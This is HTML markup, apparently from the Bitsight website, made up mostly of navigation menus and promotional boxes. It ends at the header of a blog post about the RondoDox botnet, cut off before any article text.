+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--data-correlation--studies">
+              <div class="menu-title"><a href="/platform/correlation-to-outcomes" data-drupal-link-system-path="node/411">Data Correlation &amp; Studies</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--explore-data">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Explore Data</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--groma-explorer-internet-software-observations">
+              <div class="menu-title"><a href="/groma-explorer" data-drupal-link-system-path="node/15696">Groma Explorer: internet software observations</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--underground-explorer-cybercrime-statistics">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/underground" data-drupal-link-system-path="node/18606">Underground Explorer: cybercrime statistics</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+      
+            <div class="field field--name-field-cta field--type-custom field--label-hidden field__item">
+                          
+  <h2 class="eyebrow field__item">Spotlight</h2>
+  <div class="cta-title field__item">Bitsight delivered 297% ROI for security leaders</div>
+  <div class="body-text custom-field__item field--name-text field--type-string-long field--label-hidden"><p>Read the Total Economic Impact™ Of Bitsight study conducted by Forrester Consulting to see how bolstering your cyber security program with Bitsight can protect your business while improving your bottom line.&nbsp;</p></div>
+  <div class="cta-link custom-field__item field--name-link-uri field--type-uri field--label-hidden"><a href="/press-releases/bitsight-delivered-297-roi-reduced-probability-cyber-security-breach-45-across-first-and-third-parties">View study</a></div>
+
+              </div>
+      
+  </ul>
+
+
+
+  </div>
+  <div class="cta-secondary">
+    <div class="cta-secondary--inner container">
+      
+            <div class="field field--name-field-cta-secondary field--type-link field--label-hidden field__item">
+                          <a href="/demo/bitsight-demo" hreflang="en">Get a demo</a>
+              </div>
+      
+    </div>
+  </div>
+</div>
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--company for-view-mode--megamenu_panel">
+              <span>Company</span>
+                          
+<div class="menu__dropdown">
+  <div class="menu__dropdown-inner container">
+        
+      <ul class="menu menu-level-1">
+    
+          
+    <li class="menu-item menu-item--expanded menu-item-name--about-us">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>About Us</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--our-story for-view-mode--default">
+              <div class="menu-title"><a href="/about/our-story" data-drupal-link-system-path="node/316">Our Story</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--why-bitsight">
+              <div class="menu-title"><a href="/about/why-bitsight" data-drupal-link-system-path="node/13121">Why Bitsight</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--our-team">
+              <div class="menu-title"><a href="/about/our-team" data-drupal-link-system-path="node/391">Our Team</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--trust-center">
+              <div class="menu-title"><a href="/about/trust-center" data-drupal-link-system-path="node/15156">Trust Center</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--belonging--inclusion">
+              <div class="menu-title"><a href="/about/diversity-and-inclusion" data-drupal-link-system-path="node/12511">Belonging &amp; Inclusion</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--awards--recognition">
+              <div class="menu-title"><a href="/about/awards-and-recognition" data-drupal-link-system-path="node/19116">Awards &amp; Recognition</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--press-releases">
+              <div class="menu-title"><a href="/press-releases" data-drupal-link-system-path="node/541">Press Releases</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--partnerships">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Partnerships</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--partner-programs">
+              <div class="menu-title"><a href="/partners" data-drupal-link-system-path="node/11371">Partner Programs</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--moodys-partnership">
+              <div class="menu-title"><a href="/partners/moodys" data-drupal-link-system-path="node/15216">Moody&#039;s Partnership</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--microsoft-partnership">
+              <div class="menu-title"><a href="/partners/microsoft" data-drupal-link-system-path="node/16761">Microsoft Partnership</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--cyber-data-for-capital-markets">
+              <div class="menu-title"><a href="/data/capital-markets" data-drupal-link-system-path="node/14161">Cyber Data for Capital Markets</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--connect-with-us">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Connect with Us</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item--expanded menu-item-name--careers for-view-mode--submenu_circle_list">
+              <div class="menu-title"><a href="/about/careers" data-drupal-link-system-path="node/281">Careers</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-submenu-circle-list menu-dropdown menu-dropdown-2 menu-type-submenu_circle_list">
+              
+    <ul class="menu menu-level-3">
+          
+    <li class="menu-item menu-item-name--open-positions">
+              <div class="menu-title"><a href="https://bitsight.wd1.myworkdayjobs.com/Bitsight">Open Positions</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--events">
+              <div class="menu-title"><a href="/events">Events</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--in-the-news">
+              <div class="menu-title"><a href="/news" data-drupal-link-system-path="node/536">In the news</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--locations">
+              <div class="menu-title"><a href="/contact-us" data-drupal-link-system-path="node/371">Locations</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--contact-us">
+              <div class="menu-title"><a href="/contact-us" data-drupal-link-system-path="node/371">Contact Us</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+      
+            <div class="field field--name-field-cta field--type-custom field--label-hidden field__item">
+                          
+  <h2 class="eyebrow field__item">Spotlight</h2>
+  <div class="cta-title field__item">Bitsight Unites Risk and Security Leaders on a Single Intelligence Platform to Combat the Surge in Supply Chain Breaches</div>
+  <div class="cta-link custom-field__item field--name-link-uri field--type-uri field--label-hidden"><a href="/press-releases/bitsight-unites-risk-and-security-leaders-single-intelligence-platform-combat-surge">Read the press release</a></div>
+
+              </div>
+      
+  </ul>
+
+
+
+  </div>
+  <div class="cta-secondary">
+    <div class="cta-secondary--inner container">
+      
+            <div class="field field--name-field-cta-secondary field--type-link field--label-hidden field__item">
+                          <a href="/demo/bitsight-demo" hreflang="en">Get a demo</a>
+              </div>
+      
+    </div>
+  </div>
+</div>
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--resources for-view-mode--megamenu_panel">
+              <span>Resources</span>
+                          
+<div class="menu__dropdown">
+  <div class="menu__dropdown-inner container">
+        
+      <ul class="menu menu-level-1">
+    
+          
+    <li class="menu-item menu-item--expanded menu-item-name--resources">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <a href="/resources" data-drupal-link-system-path="node/546">Resources</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--customer-stories">
+              <div class="menu-title"><a href="/customers">Customer Stories</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--analyst-reports">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=2161" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;2161&quot;}" data-drupal-link-system-path="node/546">Analyst Reports</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--research">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=231" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;231&quot;}" data-drupal-link-system-path="node/546">Research</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--product-datasheets">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=266" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;266&quot;}" data-drupal-link-system-path="node/546">Product datasheets</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--guides">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=2156" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;2156&quot;}" data-drupal-link-system-path="node/546">Guides</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--webinars">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=256" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;256&quot;}" data-drupal-link-system-path="node/546">Webinars</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--videos">
+              <div class="menu-title"><a href="/resources?field_resource_type_target_id=241" data-drupal-link-query="{&quot;field_resource_type_target_id&quot;:&quot;241&quot;}" data-drupal-link-system-path="node/546">Videos</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--all-resources">
+              <div class="menu-title"><a href="/resources" data-drupal-link-system-path="node/546">All Resources</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--bitsight-trace">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Bitsight TRACE</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item--expanded menu-item-name--latest-security-research for-view-mode--submenu_circle_list">
+              <div class="menu-title"><a href="/trace" data-drupal-link-system-path="node/13556">Latest Security Research</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-submenu-circle-list menu-dropdown menu-dropdown-2 menu-type-submenu_circle_list">
+              
+    <ul class="menu menu-level-3">
+          
+    <li class="menu-item menu-item-name--_026-state-of-the-underground">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/report/state-of-the-underground-2026" data-drupal-link-system-path="node/19581">2026 State of the Underground</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--cyber-risk-in-the-global-supply-chain">
+              <div class="menu-title"><a href="/resources/hidden-pillars-global-supply-chain" data-drupal-link-system-path="node/16076">Cyber Risk in the Global Supply Chain</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-3 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--meet-the-trace-team">
+              <div class="menu-title"><a href="/trace/about" data-drupal-link-system-path="node/13821">Meet the TRACE team</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item--expanded menu-item-name--learn">
+              <div class="menu-title">
+            <div class="field field--name-field-icon field--type-fontawesome-icon field--label-hidden field__item">
+                          <div class="fontawesome-icons">
+      <div class="fontawesome-icon">
+  <i class="fak fa-corner fa-xs" data-fa-transform="" data-fa-mask="" style=""></i>
+</div>
+
+  </div>
+
+              </div>
+      <span>Learn</span></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-1 menu-type-default">
+              
+    <ul class="menu menu-level-2">
+          
+    <li class="menu-item menu-item-name--blog">
+              <div class="menu-title"><a href="/blog" data-drupal-link-system-path="node/531">Blog</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--interactive-product-tours">
+              <div class="menu-title"><div class="is-new">New</div>
+<a href="/products/tours" data-drupal-link-system-path="node/16196">Interactive Product Tours</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--third-party-risk-management">
+              <div class="menu-title"><a href="/learn/tprm" data-drupal-link-system-path="node/17296">Third-Party Risk Management</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--threat-intelligence">
+              <div class="menu-title"><a href="/learn/cti" data-drupal-link-system-path="node/16286">Threat Intelligence</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--compliance">
+              <div class="menu-title"><a href="/learn/compliance" data-drupal-link-system-path="node/16291">Compliance</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--cybersecurity-glossary">
+              <div class="menu-title"><a href="/glossary" data-drupal-link-system-path="node/13276">Cybersecurity Glossary</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+        
+    <li class="menu-item menu-item-name--bitsight-knowledge-base">
+              <div class="menu-title"><a href="https://help.bitsighttech.com/hc/en-us">Bitsight Knowledge Base</a></div>
+                          
+  
+  <div class="menu_link_content menu-link-contentmain view-mode-default menu-dropdown menu-dropdown-2 menu-type-default">
+              
+      </div>
+
+
+
+          </li>
+    </ul>
+
+
+
+      </div>
+
+
+
+          </li>
+      
+            <div class="field field--name-field-cta field--type-custom field--label-hidden field__item">
+                          
+  <h2 class="eyebrow field__item">Spotlight</h2>
+  <div class="cta-title field__item">Bitsight named a 2026 leader in the Forrester Wave™ for cybersecurity risk ratings</div>
+  <div class="body-text custom-field__item field--name-text field--type-string-long field--label-hidden"><p><span style="white-space:pre-wrap;">Bitsight received the highest possible scores across 11 criteria.</span></p></div>
+  <div class="cta-link custom-field__item field--name-link-uri field--type-uri field--label-hidden"><a href="/resources/2026-forrester-wave-cybersecurity-risk-rating-platforms">Download report</a></div>
+
+              </div>
+      
+  </ul>
+
+
+
+  </div>
+  <div class="cta-secondary">
+    <div class="cta-secondary--inner container">
+      
+            <div class="field field--name-field-cta-secondary field--type-link field--label-hidden field__item">
+                          <a href="/demo/bitsight-demo" hreflang="en">Get a demo</a>
+              </div>
+      
+    </div>
+  </div>
+</div>
+
+          </li>
+    </ul>
+
+    </nav>
+  </div>
+  <nav role="navigation" aria-labelledby="block-utility-mobile-menu" id="block-utility-mobile" class="mobile-only">
+            
+  <h2 class="visually-hidden" id="block-utility-mobile-menu">Utility (mobile)</h2>
+  
+
+        
+              <ul data-media-display="mobile" class="menu menu--horizontal">
+              <li>
+        <a href="/blog" data-drupal-link-system-path="node/531">Blog</a>
+              </li>
+          <li>
+        <a href="/trace" data-drupal-link-system-path="node/13556">TRACE</a>
+              </li>
+          <li>
+        <a href="/demo/bitsight-demo" data-drupal-link-system-path="node/8866">Request Demo</a>
+              </li>
+          <li>
+        <a href="#chatnow">Chat With Us</a>
+              </li>
+          <li>
+        <a href="https://service.bitsighttech.com/">Login</a>
+              </li>
+        </ul>
+  
+
+
+  </nav>
+
+</section>
+
+
+  <div class="main-menu__cta"><a href="/report/security-ratings-snapshot" class="btn btn--primary">Free Cyber Risk Report</a></div>
+
+
+
+              </div>
+    </div>
+  </header>
+
+  
+  
+  
+  
+  
+  
+  
+
+  <main role="main">
+    <a id="main-content" tabindex="-1"></a>    <div  class="layout-content">
+        <div>
+    <div data-drupal-messages-fallback class="hidden"></div>  <div id="block-bitsight-theme-content" class="block block-system block-system-main-block">
+    
+    
+          
+<article class="node node--type-blog node--view-mode-full">
+
+  <div class="container blog__header">
+    <div class="blog__header__content">
+      
+
+  <h1  class="heading heading__without-link">
+          RondoDox Botnet: From Zero to 174 Exploited Vulnerabilities
+          </h1>
+      <time class="blog__date">
+        March 11, 2026
+      </time>
+            <div class="blog__topics">
+        <h2>Tags:</h2>
+        <div id="taxonomy-term-496" class="term-topic-link">
+  
+      <a href="/blog?field_topics_target_id=496">Bitsight Research</a>
+    
+</div>
+<div id="taxonomy-term-2286" class="term-topic-link">
+  
+      <a href="/blog?field_topics_target_id=2286">Operational Technology</a>
+    
+</div>
+
+      </div>
+          </div>
+
+        <div class="blog__media image-angle">
+      
+
+<div class="media-item">
+      <div class="">
+        <picture>
+                  <source srcset="/sites/default/files/styles/thumbnail/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=tN6Tgm8o 100w, /sites/default/files/styles/medium/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=I4mAlk36 220w, /sites/default/files/styles/large/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=B9ZJQHtB 480w, /sites/default/files/styles/blog/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=irb-k8V5 642w, /sites/default/files/styles/16_9_xlarge/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=vn1dg9yD 720w, /sites/default/files/styles/16_9_large_2x/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.webp?itok=zbWTAJNl 1280w" type="image/webp" sizes="100vw" width="220" height="123"/>
+              <source srcset="/sites/default/files/styles/thumbnail/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=tN6Tgm8o 100w, /sites/default/files/styles/medium/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=I4mAlk36 220w, /sites/default/files/styles/large/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=B9ZJQHtB 480w, /sites/default/files/styles/blog/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=irb-k8V5 642w, /sites/default/files/styles/16_9_xlarge/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=vn1dg9yD 720w, /sites/default/files/styles/16_9_large_2x/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=zbWTAJNl 1280w" type="image/png" sizes="100vw" width="220" height="123"/>
+                  <img loading="eager" height="405" width="720" srcset="/sites/default/files/styles/thumbnail/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=tN6Tgm8o 100w, /sites/default/files/styles/medium/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=I4mAlk36 220w, /sites/default/files/styles/large/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=B9ZJQHtB 480w, /sites/default/files/styles/blog/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=irb-k8V5 642w, /sites/default/files/styles/16_9_xlarge/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=vn1dg9yD 720w, /sites/default/files/styles/16_9_large_2x/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=zbWTAJNl 1280w" sizes="100vw" src="/sites/default/files/styles/16_9_xlarge/public/2026/03/09/Following%20the%20Breadcrumbs-%20How%20the%20RondoDox%20Botnet%20Built%20Its%20Infrastructure%20blog%20banner.png?itok=vn1dg9yD" alt="Following the Breadcrumbs- How the RondoDox Botnet Built Its Infrastructure blog banner" />
+
+  </picture>
+
+    </div>
+    </div>
+    </div>
+      </div>
+
+  <div class="container blog__share">
+    <span>Share:</span>
+    
+
+<div class="social-menu">
+  <ul class="social-menu-items">
+          <li class="social-menu-item">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis" title="Facebook" class="site-footer__social-icon">
+          <span class="visually-hidden">Facebook</span>
+            <div class="icon ">
+    <svg width="28" height="30" viewBox="0 0 28 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd"
+    d="M6.67688 2.5C4.46774 2.5 2.67688 4.29086 2.67688 6.5V23.5C2.67688 25.7091 4.46774 27.5 6.67688 27.5H13.8585V18.9472H11.1824V15.6141H13.8585V13.1561C13.8585 10.3034 15.478 8.75 17.8444 8.75C18.978 8.75 19.9516 8.8411 20.2357 8.8816V11.8632L18.5947 11.8641C17.308 11.8641 17.0591 12.5221 17.0591 13.4865V15.615H20.1279L19.7283 18.9482H17.0591V27.5H21.31C23.5191 27.5 25.31 25.7091 25.31 23.5V6.5C25.31 4.29086 23.5191 2.5 21.31 2.5H6.67688Z"
+    fill="white" />
+</svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://twitter.com/intent/tweet?url=https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis" title="Twitter" class="site-footer__social-icon">
+          <span class="visually-hidden">Twitter</span>
+            <div class="icon ">
+    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="30" viewBox="0 0 512 512"><!--!Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </div>
+
+        </a>
+      </li>
+          <li class="social-menu-item">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.bitsight.com/blog/rondodox-botnet-infrastructure-analysis" title="LinkedIn" class="site-footer__social-icon">
+          <span class="visually-hidden">LinkedIn</span>
+            <div class="icon ">
+    <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path
